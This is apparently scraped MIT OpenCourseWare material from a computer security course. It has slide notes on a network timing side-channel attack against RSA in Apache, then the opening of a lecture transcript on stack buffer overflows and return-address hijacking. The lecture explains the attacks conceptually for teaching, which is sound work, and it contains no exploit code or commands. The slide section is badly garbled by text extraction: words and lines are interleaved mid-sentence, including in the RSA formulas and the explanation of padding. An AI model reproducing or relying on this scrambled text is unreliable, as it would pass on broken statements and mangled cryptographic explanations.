ot	&#13; takes	&#13; to	&#13; load	&#13; a	&#13; page	&#13; in	&#13; browser	&#13; (depends	&#13; if	&#13; it	&#13; was	&#13; cach
.	&#13; ed).	&#13; 
 Ref:	&#13; https://www.usenix.or
But	&#13; attacks	&#13; on	&#13; passwords	&#13; or	&#13; keys	&#13; are	&#13; usually	&#13; the	&#13; most	&#13; damaging.	&#13; side-channel -attacks -printerg/confer
s	&#13; ence/usenixsecurity10/acoustic -
	&#13; 
Adversary	&#13; can	&#13; analyze	&#13; information	&#13; leaks,	&#13; use	&#13; it	&#13; to	&#13; reconstruct	&#13; private	&#13; key.	&#13; 
 Curren
o 
o t
E.g.,	&#13; Apache	&#13; web	&#13; server	&#13; running	&#13; on	&#13; some	&#13; Internet-connected	&#13; machine.	&#13; ly,	&#13; side-channel	&#13; attacks	&#13; on	&#13; systems	&#13; described	&#13; in	&#13; the	&#13; paper	&#13; are	&#13; rare.	&#13; 
o Often	&#13; some	&#13; other	&#13; vulnerability	&#13; exists	&#13; and	&#13; is	&#13; easier	&#13; to	&#13; exploit.	&#13; 
 Slowly	&#13; becoming	&#13; a	&#13; bigger	&#13; concern:	&#13; new	&#13; side-
Side
o-channel	&#13; attacks	&#13; are	&#13; more	&#13; commonly	&#13; used	&#13; to	&#13; attack	&#13; trusted/embedded	&#13; hw.	&#13; 
 attacks.	&#13; channels	&#13; (VMs),	&#13; better	&#13; 
o 
o E.g.,	&#13; chip	&#13; running	&#13; cryptographic	&#13; operations	&#13; on	&#13; a	&#13; smartcard.	&#13; 
Often	&#13; these	&#13; have	&#13; a	&#13; small	&#13; attack	&#13; surface,	&#13; not	&#13; many	&#13; other	&#13; ways	&#13; to	&#13; get	&#13; in.	&#13; 
As	&#13; paper	&#13; mentions,	&#13; some	&#13; crypto	&#13; co
attack.	&#13; processors	&#13; designed	&#13; to	&#13; avoid	&#13; this	&#13; 
	&#13; 
Wh
 
 at'
Timing	&#13; attacks	&#13; known	&#13; for	&#13; a	&#13; while.	&#13; s	&#13; this	&#13; paper's	&#13; contribution? 	&#13; 
 
 This	&#13; paper:	&#13; possible	&#13; to	&#13; attack	&#13; standard	&#13; Apache	&#13; web	&#13; server	&#13; over	&#13; the	&#13; network.Uses	&#13; lots	&#13; of	&#13; observations/techniques	&#13; from	&#13; prior	&#13; work	&#13; on	&#13; timing	&#13; attacks.	&#13; 	&#13; 
To	&#13; understand	&#13; how	&#13; this	&#13; works,	&#13; first	&#13; let's 	&#13; look	&#13; at	&#13; some	&#13; internals	&#13; of	&#13; RSA	&#13; 
	&#13; 
1</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>RSA:	&#13; high	&#13; level	&#13; plan	&#13; 
 
  Pick	&#13; two	&#13; random	&#13; primes,	&#13; p	&#13; and	&#13; q.	&#13; 	&#13; Let	&#13; n	&#13; =	&#13; p*q.	&#13; A	&#13; reasonable	&#13; key	&#13; length,	&#13; i.e.,	&#13; |n|	&#13; or	&#13; |d|,	&#13; is	&#13; 2048	&#13; bits	&#13; today.	&#13; Euler's	&#13; function	&#13; phi(n):	&#13; number	&#13; of	&#13; elements	&#13; of	&#13; Z_n^*	&#13; relatively	&#13; prime	&#13; to	&#13; n.	&#13; 
o 
 So,	&#13; how	&#13; to	&#13; encr
o Theorem	&#13; [no	&#13; proof	&#13; here]:	&#13; a^(phi(n))	&#13; =	&#13; 1	&#13; mod	&#13; n,	&#13; for	&#13; all	&#13; a	&#13; and	&#13; n.	&#13; 
Pick	&#13; two	&#13; exponents	&#13; d	&#13; and	&#13; e,	&#13; such	&#13; that	&#13; m^(e*d)	&#13; =	&#13; m	&#13; (mod	&#13; n),	&#13; which	&#13; means	&#13; ypt	&#13; and	&#13; decrypt?	&#13; 
o 
 e*d	&#13; =	&#13; 1	&#13; mod	&#13; phi(n).	&#13; 
How
o	&#13; 
 to	&#13; Encryption	&#13; will	&#13; be	&#13; c	&#13; =	&#13; m^e	&#13; (mod	&#13; n);	&#13; decryption	&#13; will	&#13; be	&#13; m	&#13; =	&#13; c^d	&#13; (mod	&#13; n).	&#13; 
o For	&#13; get	&#13; 
o Easy	&#13; to	&#13; compute	&#13; d=1/e,	&#13; if	&#13; we	&#13; know	&#13; phi(n).	&#13; nsu
=pch	&#13; 
q,e	&#13; 
	&#13; pa
hi(nnd	&#13; d?
)	&#13; =	&#13; 	&#13; 
(p-1)(q-1). 	&#13; 
Extended	&#13; Euclidean	&#13; algorithm.	&#13; 
 
o 
 In	&#13; practice,	&#13; pickRef:	&#13; http://en.wikipedia.or
	&#13; small	&#13; e	&#13; (e.g.,	&#13; 65537),	&#13; to	&#13; make	&#13; encryption	&#13; fast.	&#13; g/wiki/ Modular_multiplicative_inverse	&#13; 
 Pub
Privat
olic	&#13; k
 e	&#13; key	&#13; is	&#13; (n,	&#13; e).
ey	&#13; is,	&#13; in	&#13; principl	&#13; 
o Note:	&#13; p	&#13; and	&#13; q	&#13; must	&#13; be	&#13; kept	&#13; secret!e,	&#13; (n,	&#13; d). 	&#13; 
o Otherwise,	&#13; adversary	&#13; can	&#13; compute	&#13; d	&#13; from	&#13; e,	&#13; as	&#13; we	&#13; did	&#13; above.	&#13; 	&#13; 
o Kno
So,	&#13; in	&#13; prwing	&#13; p	&#13; and
actice,	&#13; pr	&#13; q	&#13; als
ivate	&#13; key	&#13; includes	&#13; (p,	&#13; q)	&#13; as	&#13; well.o	&#13; turns	&#13; out	&#13; to	&#13; be	&#13; helpful	&#13; for	&#13; fas
	&#13; t	&#13; decryption. 	&#13; 
	&#13; 
RSA	&#13; is	&#13; tricky	&#13; to	&#13; use	&#13; "securely"	&#13; --	&#13; be	&#13; careful	&#13; if	&#13; using	&#13; RSA	&#13; directly!	&#13; 
 Ciphertexts	&#13; are	&#13; multiplicative	&#13; 
o 
o 
 E(a)*E(b)	&#13; =Can	&#13; allow	&#13; adversary	&#13; to	&#13; manipulate	&#13; encryptions,	&#13; generate	&#13; a^e	&#13; *	&#13; b^e	&#13; =	&#13; (ab)^e.	&#13; 
RSA	&#13; is	&#13; deterministic	&#13; 
o 	&#13; new	&#13; ones. 	&#13; 
o Encrypting	&#13; the	&#13; same	&#13; plaintext	&#13; will	&#13; generate	&#13; the	&#13; same	&#13; ciphertext	&#13; each	&#13; 
 time.	&#13; 
Typically	&#13; solved	&#13; by	&#13; "padding"	&#13; messages	&#13; before	&#13; encryption.	&#13; 
o Adversary	&#13; can	&#13; tell	&#13; when	&#13; the	&#13; same	&#13; thing	&#13; is	&#13; being	&#13; re-encrypted.	&#13; 
o o http://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding	&#13; 
o Take	&#13; plaintext	&#13; message	&#13; bits,	&#13; add	&#13; padding	&#13; bits	&#13; before	&#13; and	&#13; after	&#13; plaintext.	&#13; 
o Encrypt	&#13; the	&#13; combined	&#13; bits	&#13; (must	&#13; be	&#13; less	&#13; than	&#13; |n|	&#13; bits	&#13; total).	&#13; Padding	&#13; includes	&#13; randomness,	&#13; as	&#13; well	&#13; as	&#13; fixed	&#13; bit	&#13; pat
Helps	&#13; detect	&#13; tampering	&#13; (e.g.	&#13; ciphertext	&#13; multiplication).	&#13; terns.	&#13; 
	&#13; H
 ow	&#13; to	&#13; implement	&#13; RSA?	&#13; 
Key	&#13; problem:	&#13; fast	&#13; modular	&#13; exponentiation.	&#13; 
o 
 MultiIn	&#13; general,	&#13; quadratic	&#13; complexity.	&#13; 
Optimization	&#13; 1:	&#13; C
	&#13;  Computing	&#13; the	&#13; modulus	&#13; for	&#13; 1024-bit	&#13; numbers	&#13; is	&#13; slow	&#13; plying	&#13; two	&#13; 1024 -bit	&#13; numbers	&#13; is	&#13; slow.	&#13; 
(1024-bit	&#13; divison). 	&#13; 
 hinese	&#13; Remainder	&#13; Theorem	&#13; (CRT).	&#13; 
Recall	&#13; what	&#13; the	&#13; CRT	&#13; says:	&#13; 
2</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-2-control-hijacking-attacks/</video_url>
          <video_title>Lecture 2: Control Hijacking Attacks</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation, or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:26</time_slice>
              <text_slice>PROFESSOR: This
is very exciting.</text_slice>
            </slice>
            <slice>
              <time_slice>0:28</time_slice>
              <text_slice>In the previous
lecture, we learned</text_slice>
            </slice>
            <slice>
              <time_slice>0:29</time_slice>
              <text_slice>all about buffer
overflow attacks,</text_slice>
            </slice>
            <slice>
              <time_slice>0:32</time_slice>
              <text_slice>and today we're
going to continue</text_slice>
            </slice>
            <slice>
              <time_slice>0:34</time_slice>
              <text_slice>to discuss some techniques
to launch these attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>0:37</time_slice>
              <text_slice>So, the basic idea of all
these buffer overflow attacks</text_slice>
            </slice>
            <slice>
              <time_slice>0:41</time_slice>
              <text_slice>is as follows.</text_slice>
            </slice>
            <slice>
              <time_slice>0:42</time_slice>
              <text_slice>So, first of all, they leverage
a couple different facts.</text_slice>
            </slice>
            <slice>
              <time_slice>0:54</time_slice>
              <text_slice>So, one thing that they
leverage is that system software</text_slice>
            </slice>
            <slice>
              <time_slice>0:58</time_slice>
              <text_slice>is often written in C.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07</time_slice>
              <text_slice>And so by system
software, I mean things</text_slice>
            </slice>
            <slice>
              <time_slice>1:10</time_slice>
              <text_slice>like databases, compilers,
network servers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12</time_slice>
              <text_slice>things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15</time_slice>
              <text_slice>And you can also think of things
like your favorite command</text_slice>
            </slice>
            <slice>
              <time_slice>1:17</time_slice>
              <text_slice>shell.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18</time_slice>
              <text_slice>All of those types of things
are typically written in C. So,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21</time_slice>
              <text_slice>why are these things
typically written in C?</text_slice>
            </slice>
            <slice>
              <time_slice>1:23</time_slice>
              <text_slice>Well, they're written in
C because our community,</text_slice>
            </slice>
            <slice>
              <time_slice>1:25</time_slice>
              <text_slice>of course, is
obsessed with speed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:28</time_slice>
              <text_slice>And so C is supposed to be
like high-level assembly,</text_slice>
            </slice>
            <slice>
              <time_slice>1:31</time_slice>
              <text_slice>it takes us very close to the
hardware, and so as a result,</text_slice>
            </slice>
            <slice>
              <time_slice>1:34</time_slice>
              <text_slice>all these very mission
critical systems</text_slice>
            </slice>
            <slice>
              <time_slice>1:36</time_slice>
              <text_slice>are written in this
very low level language.</text_slice>
            </slice>
            <slice>
              <time_slice>1:38</time_slice>
              <text_slice>Now, the problem with
things being written in C</text_slice>
            </slice>
            <slice>
              <time_slice>1:42</time_slice>
              <text_slice>is that C actually exposes
raw memory Addresses.</text_slice>
            </slice>
            <slice>
              <time_slice>1:57</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:57</time_slice>
              <text_slice>And so not only does it
expose raw memory addresses,</text_slice>
            </slice>
            <slice>
              <time_slice>2:00</time_slice>
              <text_slice>but it also performs no
bounds checking when programs</text_slice>
            </slice>
            <slice>
              <time_slice>2:04</time_slice>
              <text_slice>manipulate those raw addresses.</text_slice>
            </slice>
            <slice>
              <time_slice>2:06</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>2:07</time_slice>
              <text_slice>And so as you can imagine,
this is a recipe for disaster.</text_slice>
            </slice>
            <slice>
              <time_slice>2:09</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
            <slice>
              <time_slice>2:10</time_slice>
              <text_slice>So, once again, why doesn't
C check these bounds?</text_slice>
            </slice>
            <slice>
              <time_slice>2:13</time_slice>
              <text_slice>Well, one reason is because
the hardware doesn't do that.</text_slice>
            </slice>
            <slice>
              <time_slice>2:15</time_slice>
              <text_slice>And people who
write in C typically</text_slice>
            </slice>
            <slice>
              <time_slice>2:17</time_slice>
              <text_slice>want the max amount
of speed possible.</text_slice>
            </slice>
            <slice>
              <time_slice>2:20</time_slice>
              <text_slice>The other reason is that in
C, as we'll discuss later,</text_slice>
            </slice>
            <slice>
              <time_slice>2:23</time_slice>
              <text_slice>it can actually be very
difficult to determine</text_slice>
            </slice>
            <slice>
              <time_slice>2:25</time_slice>
              <text_slice>the semantics of what it
means to have a pointer that's</text_slice>
            </slice>
            <slice>
              <time_slice>2:28</time_slice>
              <text_slice>actually in bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>2:29</time_slice>
              <text_slice>So, in some cases, it would
be very difficult for the C</text_slice>
            </slice>
            <slice>
              <time_slice>2:31</time_slice>
              <text_slice>runtime to
automatically do that.</text_slice>
            </slice>
            <slice>
              <time_slice>2:33</time_slice>
              <text_slice>Now we'll discuss
some techniques</text_slice>
            </slice>
            <slice>
              <time_slice>2:35</time_slice>
              <text_slice>which will actually
try to do that type</text_slice>
            </slice>
            <slice>
              <time_slice>2:36</time_slice>
              <text_slice>of automatic inference.</text_slice>
            </slice>
            <slice>
              <time_slice>2:37</time_slice>
              <text_slice>But as we'll see, none
of these techniques</text_slice>
            </slice>
            <slice>
              <time_slice>2:39</time_slice>
              <text_slice>are fully bulletproof.</text_slice>
            </slice>
            <slice>
              <time_slice>2:42</time_slice>
              <text_slice>And so these attacks
also leverage knowledge</text_slice>
            </slice>
            <slice>
              <time_slice>2:48</time_slice>
              <text_slice>of the x86 architecture.</text_slice>
            </slice>
            <slice>
              <time_slice>2:56</time_slice>
              <text_slice>And by knowledge of
that architecture</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>I mean things like what's the
direction that the stack grows,</text_slice>
            </slice>
            <slice>
              <time_slice>3:01</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>3:02</time_slice>
              <text_slice>What are the calling
conventions for functions?</text_slice>
            </slice>
            <slice>
              <time_slice>3:04</time_slice>
              <text_slice>When you invoke a C
function, what is the stack</text_slice>
            </slice>
            <slice>
              <time_slice>3:06</time_slice>
              <text_slice>going to look like?</text_slice>
            </slice>
            <slice>
              <time_slice>3:07</time_slice>
              <text_slice>And when you allocate
an object on the heap,</text_slice>
            </slice>
            <slice>
              <time_slice>3:09</time_slice>
              <text_slice>what are those chief allocation
structures going to look like?</text_slice>
            </slice>
            <slice>
              <time_slice>3:12</time_slice>
              <text_slice>And so let's look
at a simple example.</text_slice>
            </slice>
            <slice>
              <time_slice>3:15</time_slice>
              <text_slice>It's very similar to
something that you</text_slice>
            </slice>
            <slice>
              <time_slice>3:18</time_slice>
              <text_slice>saw in the last lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>So, we've got you're standard
read request up here.</text_slice>
            </slice>
            <slice>
              <time_slice>3:28</time_slice>
              <text_slice>And then you've got a buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>3:30</time_slice>
              <text_slice>That's here.</text_slice>
            </slice>
            <slice>
              <time_slice>3:34</time_slice>
              <text_slice>And by now you've probably
trained your lizard brain</text_slice>
            </slice>
            <slice>
              <time_slice>3:37</time_slice>
              <text_slice>instincts-- whenever you
see a buffer you're probably</text_slice>
            </slice>
            <slice>
              <time_slice>3:39</time_slice>
              <text_slice>filled with fear-- that
is the right attitude.</text_slice>
            </slice>
            <slice>
              <time_slice>3:41</time_slice>
              <text_slice>And so we've got
the buffer up here,</text_slice>
            </slice>
            <slice>
              <time_slice>3:43</time_slice>
              <text_slice>and then we've got
the canonical int i.</text_slice>
            </slice>
            <slice>
              <time_slice>3:48</time_slice>
              <text_slice>And then we've got the
infamous "gets" command.</text_slice>
            </slice>
            <slice>
              <time_slice>3:56</time_slice>
              <text_slice>And then you've got
some other stuff here.</text_slice>
            </slice>
            <slice>
              <time_slice>3:58</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>3:59</time_slice>
              <text_slice>So as we discussed
in lecture last week,</text_slice>
            </slice>
            <slice>
              <time_slice>4:01</time_slice>
              <text_slice>this is problematic, right?</text_slice>
            </slice>
            <slice>
              <time_slice>4:03</time_slice>
              <text_slice>Because this gets operation
here does not actually</text_slice>
            </slice>
            <slice>
              <time_slice>4:05</time_slice>
              <text_slice>check the bounds on the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>4:06</time_slice>
              <text_slice>So, what can happen is that
if the user actually supplies</text_slice>
            </slice>
            <slice>
              <time_slice>4:11</time_slice>
              <text_slice>the buffer-- and actually put
that guy up here, for example--</text_slice>
            </slice>
            <slice>
              <time_slice>4:17</time_slice>
              <text_slice>if that buffer comes
in from the user</text_slice>
            </slice>
            <slice>
              <time_slice>4:19</time_slice>
              <text_slice>and we use this
unsafe function here,</text_slice>
            </slice>
            <slice>
              <time_slice>4:21</time_slice>
              <text_slice>we can actually
overflow this buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>We can actually rewrite
stuff that's on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>4:26</time_slice>
              <text_slice>So, just a reminder of
what that stuff looks</text_slice>
            </slice>
            <slice>
              <time_slice>4:29</time_slice>
              <text_slice>like-- let's look at a
stack diagram here-- so</text_slice>
            </slice>
            <slice>
              <time_slice>4:36</time_slice>
              <text_slice>let's say here we've got I.
Let's say here we've got a buf</text_slice>
            </slice>
            <slice>
              <time_slice>4:55</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>4:56</time_slice>
              <text_slice>So, we've got the first
address of buffer here.</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>We've got the last one up here.</text_slice>
            </slice>
            <slice>
              <time_slice>4:59</time_slice>
              <text_slice>I apologize for my
handwriting, I'm</text_slice>
            </slice>
            <slice>
              <time_slice>5:01</time_slice>
              <text_slice>used to writing on
the marker board.</text_slice>
            </slice>
            <slice>
              <time_slice>5:02</time_slice>
              <text_slice>You should pray for me.</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>So, anyways, then up here,
we've got the saved value</text_slice>
            </slice>
            <slice>
              <time_slice>5:11</time_slice>
              <text_slice>of the break pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>5:18</time_slice>
              <text_slice>We've got the return address
for the function there.</text_slice>
            </slice>
            <slice>
              <time_slice>5:26</time_slice>
              <text_slice>And then we've got some other
stuff from the previous frame.</text_slice>
            </slice>
            <slice>
              <time_slice>5:36</time_slice>
              <text_slice>So, don't forget, we've
got the stack pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>5:41</time_slice>
              <text_slice>which goes there.</text_slice>
            </slice>
            <slice>
              <time_slice>5:45</time_slice>
              <text_slice>And then we've got the new
break pointer, which goes here.</text_slice>
            </slice>
            <slice>
              <time_slice>6:02</time_slice>
              <text_slice>The entry stack
pointer goes there,</text_slice>
            </slice>
            <slice>
              <time_slice>6:04</time_slice>
              <text_slice>and then somewhere
up here, we've</text_slice>
            </slice>
            <slice>
              <time_slice>6:06</time_slice>
              <text_slice>got the entry break point.</text_slice>
            </slice>
            <slice>
              <time_slice>6:14</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>6:14</time_slice>
              <text_slice>So, just as a reminder, the way
that the Stack Overflow works</text_slice>
            </slice>
            <slice>
              <time_slice>6:17</time_slice>
              <text_slice>is that basically,
it goes this way.</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>So, when the gets
operation is called,</text_slice>
            </slice>
            <slice>
              <time_slice>6:24</time_slice>
              <text_slice>we start writing bytes into
buf, and eventually it's</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>going to start overwriting these
things that are on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>6:31</time_slice>
              <text_slice>And so this is
basically-- should all</text_slice>
            </slice>
            <slice>
              <time_slice>6:33</time_slice>
              <text_slice>look pretty familiar to you.</text_slice>
            </slice>
            <slice>
              <time_slice>6:34</time_slice>
              <text_slice>So.</text_slice>
            </slice>
            <slice>
              <time_slice>6:36</time_slice>
              <text_slice>What does the attacker do
to take advantage of that?</text_slice>
            </slice>
            <slice>
              <time_slice>6:38</time_slice>
              <text_slice>Basically supplies
that long input.</text_slice>
            </slice>
            <slice>
              <time_slice>6:40</time_slice>
              <text_slice>And so the key idea here is that
this can be attacker-supplied.</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>And so, if this return address
is attacker-supplied, then</text_slice>
            </slice>
            <slice>
              <time_slice>6:48</time_slice>
              <text_slice>basically the
attacker can determine</text_slice>
            </slice>
            <slice>
              <time_slice>6:50</time_slice>
              <text_slice>where this function's
going to jump to</text_slice>
            </slice>
            <slice>
              <time_slice>6:52</time_slice>
              <text_slice>after [INAUDIBLE] execution.</text_slice>
            </slice>
            <slice>
              <time_slice>6:53</time_slice>
              <text_slice>So, what can the attacker
do once it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>6:57</time_slice>
              <text_slice>been able to hijack
that return address,</text_slice>
            </slice>
            <slice>
              <time_slice>6:59</time_slice>
              <text_slice>and jump wherever it wants.</text_slice>
            </slice>
            <slice>
              <time_slice>7:00</time_slice>
              <text_slice>Well, basically
the attacker is now</text_slice>
            </slice>
            <slice>
              <time_slice>7:02</time_slice>
              <text_slice>running code with the
privileges of the process</text_slice>
            </slice>
            <slice>
              <time_slice>7:05</time_slice>
              <text_slice>that it's just
hijacked, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>7:07</time_slice>
              <text_slice>So, if that process was
a high priority process,</text_slice>
            </slice>
            <slice>
              <time_slice>7:10</time_slice>
              <text_slice>let's say it was running
root, or admin, whatever</text_slice>
            </slice>
            <slice>
              <time_slice>7:12</time_slice>
              <text_slice>they call the super-user of
your favorite operating system,</text_slice>
            </slice>
            <slice>
              <time_slice>7:15</time_slice>
              <text_slice>then now, that program, which
is controlled by the attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>7:18</time_slice>
              <text_slice>can do whatever it wants
using the authority</text_slice>
            </slice>
            <slice>
              <time_slice>7:22</time_slice>
              <text_slice>of that high-priority program.</text_slice>
            </slice>
            <slice>
              <time_slice>7:24</time_slice>
              <text_slice>So, it can do things, like
it could maybe read files,</text_slice>
            </slice>
            <slice>
              <time_slice>7:26</time_slice>
              <text_slice>it can send spam, let's say if
you corrupted a mail server.</text_slice>
            </slice>
            <slice>
              <time_slice>7:29</time_slice>
              <text_slice>It can even do things like
actually defeat firewalls,</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>right, because the
idea of a firewall</text_slice>
            </slice>
            <slice>
              <time_slice>7:35</time_slice>
              <text_slice>is that there's going
to be this distinction</text_slice>
            </slice>
            <slice>
              <time_slice>7:36</time_slice>
              <text_slice>between good machines that
are behind the firewall</text_slice>
            </slice>
            <slice>
              <time_slice>7:38</time_slice>
              <text_slice>and bad machines that are
outside of the firewall.</text_slice>
            </slice>
            <slice>
              <time_slice>7:40</time_slice>
              <text_slice>So, typically machines are
inside of the firewall,</text_slice>
            </slice>
            <slice>
              <time_slice>7:43</time_slice>
              <text_slice>they have a lot of
trust with each other.</text_slice>
            </slice>
            <slice>
              <time_slice>7:45</time_slice>
              <text_slice>But if you can
subvert a machine that</text_slice>
            </slice>
            <slice>
              <time_slice>7:46</time_slice>
              <text_slice>is actually inside the
firewall, right, that's great.</text_slice>
            </slice>
            <slice>
              <time_slice>7:50</time_slice>
              <text_slice>Because now you can just sort of
skip past a lot of those checks</text_slice>
            </slice>
            <slice>
              <time_slice>7:52</time_slice>
              <text_slice>that those machines don't have
because they think that you're</text_slice>
            </slice>
            <slice>
              <time_slice>7:55</time_slice>
              <text_slice>a trusted individual.</text_slice>
            </slice>
            <slice>
              <time_slice>7:57</time_slice>
              <text_slice>So, one thing you
might be thinking,</text_slice>
            </slice>
            <slice>
              <time_slice>7:59</time_slice>
              <text_slice>or I remember I was thinking
this when I was a student,</text_slice>
            </slice>
            <slice>
              <time_slice>8:01</time_slice>
              <text_slice>was, "OK, fine,
so I've showed you</text_slice>
            </slice>
            <slice>
              <time_slice>8:02</time_slice>
              <text_slice>how to do this buffer
overflow, but why</text_slice>
            </slice>
            <slice>
              <time_slice>8:05</time_slice>
              <text_slice>didn't the OS stop this?</text_slice>
            </slice>
            <slice>
              <time_slice>8:06</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>8:07</time_slice>
              <text_slice>Isn't the OS supposed
to be that thing that's</text_slice>
            </slice>
            <slice>
              <time_slice>8:09</time_slice>
              <text_slice>sort of sitting around like
Guardians of the Galaxy</text_slice>
            </slice>
            <slice>
              <time_slice>8:11</time_slice>
              <text_slice>and defending all this kind
of evil stuff from happening?"</text_slice>
            </slice>
            <slice>
              <time_slice>8:13</time_slice>
              <text_slice>The thing to note is that the
OS actually isn't watching you</text_slice>
            </slice>
            <slice>
              <time_slice>8:18</time_slice>
              <text_slice>all the time.</text_slice>
            </slice>
            <slice>
              <time_slice>8:19</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>8:19</time_slice>
              <text_slice>The hardware is
watching all the time.</text_slice>
            </slice>
            <slice>
              <time_slice>8:21</time_slice>
              <text_slice>It's the thing that's actually
fetching instructions,</text_slice>
            </slice>
            <slice>
              <time_slice>8:24</time_slice>
              <text_slice>and decoding them, and
doing things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>8:26</time_slice>
              <text_slice>But to a first approximation,
what does the OS do?</text_slice>
            </slice>
            <slice>
              <time_slice>8:29</time_slice>
              <text_slice>It basically sets up
some page table stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>8:31</time_slice>
              <text_slice>and then it basically
lets you, the application,</text_slice>
            </slice>
            <slice>
              <time_slice>8:33</time_slice>
              <text_slice>run, and if you ask the
operating system for services--</text_slice>
            </slice>
            <slice>
              <time_slice>8:36</time_slice>
              <text_slice>so for example, you want
to send a network packet,</text_slice>
            </slice>
            <slice>
              <time_slice>8:38</time_slice>
              <text_slice>or you want to do some
IPC, or things like that,</text_slice>
            </slice>
            <slice>
              <time_slice>8:41</time_slice>
              <text_slice>then you'll invoke
a system call,</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>and you'll actually
trap into OS.</text_slice>
            </slice>
            <slice>
              <time_slice>8:45</time_slice>
              <text_slice>But other than that,
the operating system</text_slice>
            </slice>
            <slice>
              <time_slice>8:47</time_slice>
              <text_slice>is not looking at each
and every instruction</text_slice>
            </slice>
            <slice>
              <time_slice>8:49</time_slice>
              <text_slice>that your application
is executing.</text_slice>
            </slice>
            <slice>
              <time_slice>8:52</time_slice>
              <text_slice>So, in other words, when
this buffer overflowed,</text_slice>
            </slice>
            <slice>
              <time_slice>8:56</time_slice>
              <text_slice>it's not like the
operating system</text_slice>
            </slice>
            <slice>
              <time_slice>8:57</time_slice>
              <text_slice>was looking at each of these
memory axises for signs</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>that [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:01</time_slice>
              <text_slice>All of this address
space belongs</text_slice>
            </slice>
            <slice>
              <time_slice>9:02</time_slice>
              <text_slice>to you, this [INAUDIBLE]
process right,</text_slice>
            </slice>
            <slice>
              <time_slice>9:04</time_slice>
              <text_slice>so you get to do with it what
you want to do with it, right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:06</time_slice>
              <text_slice>Or at least this is the whole
C attitude towards life, right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:08</time_slice>
              <text_slice>Life fast, die young.</text_slice>
            </slice>
            <slice>
              <time_slice>9:10</time_slice>
              <text_slice>So.</text_slice>
            </slice>
            <slice>
              <time_slice>9:10</time_slice>
              <text_slice>That's why the operating system
can't help you right there.</text_slice>
            </slice>
            <slice>
              <time_slice>9:14</time_slice>
              <text_slice>So, later in the lecture,
we will discuss some things</text_slice>
            </slice>
            <slice>
              <time_slice>9:17</time_slice>
              <text_slice>that the operating system can
do with respect to the hardware</text_slice>
            </slice>
            <slice>
              <time_slice>9:21</time_slice>
              <text_slice>so that it can help protect
against these types of attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>9:23</time_slice>
              <text_slice>Once again, it's actually
just the hardware</text_slice>
            </slice>
            <slice>
              <time_slice>9:25</time_slice>
              <text_slice>that's interposing on every
little thing that you do.</text_slice>
            </slice>
            <slice>
              <time_slice>9:27</time_slice>
              <text_slice>So, you can actually
take advantage</text_slice>
            </slice>
            <slice>
              <time_slice>9:29</time_slice>
              <text_slice>of some of that
